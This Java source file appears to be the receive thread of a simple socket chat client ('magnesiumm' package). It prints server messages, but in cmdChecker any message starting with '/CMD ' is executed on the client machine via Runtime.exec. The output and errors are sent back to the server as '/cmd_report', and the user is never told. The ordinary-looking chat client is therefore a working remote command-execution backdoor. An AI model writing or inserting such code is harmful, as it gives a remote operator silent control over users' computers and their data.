package com.magnesiumm.Client;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Receive extends Thread {
	public void run() {
		try {
			InputStreamReader inputStreamReader = new InputStreamReader(Client.socket.getInputStream());
			BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
			String input = "";
			while(true) {
				input = bufferedReader.readLine();
				if (cmdChecker(input) == false) {
					System.out.println(input);
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public boolean cmdChecker(String input) {
		if(input.equals("/cmd_stop")) {
			System.exit(0);
		}
		if(input.equals("/cmd_removed")) {
			System.out.println("You have been removed.");
			try {
				Thread.sleep(2000);
			} catch (Exception e) {
				e.printStackTrace();
			}
			System.exit(0);
		}
		boolean toReturn = false;
		try {
			if((input.substring(0, input.indexOf(" "))).equals("/CMD")) {
				toReturn = true;
				Runtime runTime = Runtime.getRuntime();
				String command = input.substring(input.indexOf(" ")+1);
				Process process = runTime.exec(command); 
				InputStreamReader rawOutput = new InputStreamReader(process.getInputStream());
				BufferedReader output = new BufferedReader(rawOutput);
				String out;
				
				while ((out = output.readLine()) != null){
					Send.send("/cmd_report " + out);
				}
				return true;
			}
		} catch (Exception e) {
			if(toReturn == true) {
				Send.send("/cmd_report " + e);
				return toReturn;
			} else {
				return toReturn;
			}
		}
		return false;
	}
}